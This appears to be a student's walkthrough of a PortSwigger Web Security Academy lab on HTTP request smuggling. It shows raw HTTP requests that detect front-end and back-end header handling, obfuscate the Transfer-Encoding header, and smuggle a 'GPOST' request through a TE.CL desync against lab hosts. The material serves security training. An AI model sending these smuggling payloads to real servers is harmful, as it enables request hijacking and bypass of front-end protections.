
Basic Lab: Obfuscating the TE header 
https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
# Detection

![](../../../Attachments/Req%20Smug/Detection%20HTTP%20Request%20Smuggling.png)

Detecting Front-end 
``` HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X

```
Got: 
```HTTP
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 27

{"error":"Invalid request"}
```
What is happening:

![](../../../Attachments/Req%20Smug/Invalid%20Chunk%20SIze.png)

Frontend is using TE

### Detecting what the backend is using

```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

```
Got a **200 OK**

What is happening:

![](../../../Attachments/Req%20Smug/TE%20TE%20Detection.png)


![](../../../Attachments/Req%20Smug/TE%20Header%20Obfuscations.png)

Tried adding a second malformed Transfer-Encoding. 
```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0

X

```

![](../../../Attachments/Req%20Smug/TE%20Obfuscation%20visual.png)
Causes the backend to timeout and **500 Internal Server Error**

# Confirming
Now we can exchange the lab to a TE.CL vulnerability.
```HTTP
POST / HTTP/1.1
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

1
G
0


```
>**200 OK**

Immediately send a normal request:
```HTTP
POST / HTTP/2
Host: 0a8300d803e4d2088a266c310091008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar

```
Got **"Unrecognized method G0POST"**
![](../../../Attachments/Req%20Smug/TE.TE%20confirmation.png)

# Crafting the exploit request

#### Updating the Content-Length of the smuggled request

Determining the minimum value for the smuggled request. 
>Adding one (+1) to the smugled request body so it can append to normal request.

![](../../../Attachments/Req%20Smug/Pasted%20image%2020250818135755.png)

#### Fixing the Chunk Size

![](../../../Attachments/Req%20Smug/Pasted%20image%2020250818140740.png)


#### Fixing the first Content-Length

![](../../../Attachments/Req%20Smug/Pasted%20image%2020250818141150.png)

# Exploiting
```HTTP
POST / HTTP/1.1
Host: 0a3400f70367a7d68109ed3b007e009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

x=1
0


```
**200 OK**

Immediately send the normal request:
```
POST / HTTP/2
Host: 0a3400f70367a7d68109ed3b007e009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

foo=bar
```
Got the **"Unrecognized method GPOST"**

[Explained](https://www.youtube.com/watch?v=TUsc14YH6LE&list=PLGb2cDlBWRUX1_7RAIjRkZDYgAB3VbUSw&index=3&ab_channel=JarnoTimmermans)